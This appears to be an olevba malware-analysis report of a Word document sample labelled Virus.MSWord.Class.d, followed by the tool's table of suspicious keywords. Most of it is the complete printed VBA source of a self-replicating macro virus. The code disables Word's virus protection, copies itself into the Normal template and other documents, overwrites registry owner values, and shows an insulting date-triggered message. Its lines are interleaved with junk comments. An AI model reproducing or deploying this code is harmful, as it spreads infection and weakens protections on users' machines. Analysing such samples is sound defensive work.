olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-0080c831f595246d3275a48c7252789bf2151dc2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-0080c831f595246d3275a48c7252789bf2151dc2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
Const REG_SZ As Long = 1
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
Const HKEY_CURRENT_USER As Long = &H80000001
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
Sub AutoOpen()
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
On Error GoTo out
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
Options.VirusProtection = False
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
Options.SaveNormalPrompt = False
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
Options.ConfirmConversions = False
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
If nt > 70 And ad > 0 Then GoTo out
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
If nt < 70 Then
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
End If
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
host.codemodule.AddFromFile ("c:\class.sys")
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
With host.codemodule
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
    For x = 1 To 16
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
    .deletelines 1
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
    Next x
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
End With
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
If nt < 70 Then
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
    With host.codemodule
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
    .replaceline 1, "Sub AutoClose()"
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
    .replaceline 91, "Sub ToolsMacro()"
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
    For x = 70 To 81
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
        .deletelines 62
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
    Next x
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
    .replaceline 35, "    For x = 1 To 4"
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
    End With
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
End If
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
If nt < 70 Then
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
u = RegCloseKey(k)
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
End If
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
With host.codemodule
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
    For x = 2 To 104 Step 2
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
    Next x
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
End With
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
out:
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
End Sub
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
Sub ViewVBCode()
'K.V.RAJARAM2/25/99 12:16:50 PMHP DeskJet 820C Series Printer on LPT1:MINUTES OF THE INDUSTRY MEETING ON IPP
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
